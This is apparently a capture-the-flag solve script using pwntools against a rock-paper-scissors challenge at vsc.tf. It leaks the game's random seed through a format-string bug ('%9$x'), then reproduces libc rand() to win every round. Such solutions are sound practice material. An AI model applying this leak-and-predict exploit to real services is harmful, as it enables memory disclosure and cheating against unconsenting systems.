from pwn import *
from ctypes import CDLL
context.log_level = 'debug'

# Fuzzer
# for i in range(100):
# 	try:
# 		p = process('./rps')
# 		p.sendlineafter(b'Enter your name: ', '%{}$x'.format(i).encode())
# 		print("i = ", i)
# 		print(p.recvline())
# 		p.close()
# 	except EOFError:
# 		pass

# FORMAT STRING VULN. LEAK SEED AND USE IT FOR srand() init
# io = process('./rps')
io = remote ('vsc.tf', 3094)
io.sendlineafter(b"Enter your name: ", '%9$x'.encode())
byte_str = io.recvline()
leaked_seed = byte_str.decode('utf-8')
leaked_seed = int(leaked_seed.split(' ')[1].strip(), 16)
print(leaked_seed)
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(leaked_seed)

for i in range(50):
	opponent_choice = libc.rand()%3
	if opponent_choice == 0: # ROCK
		io.sendlineafter(b"Enter your choice (r/p/s): ", b"p")
	elif opponent_choice == 1: # PAPER
		io.sendlineafter(b"Enter your choice (r/p/s): ", b"s")
	else:
		io.sendlineafter(b"Enter your choice (r/p/s): ", b"r")

print(io.recvall())
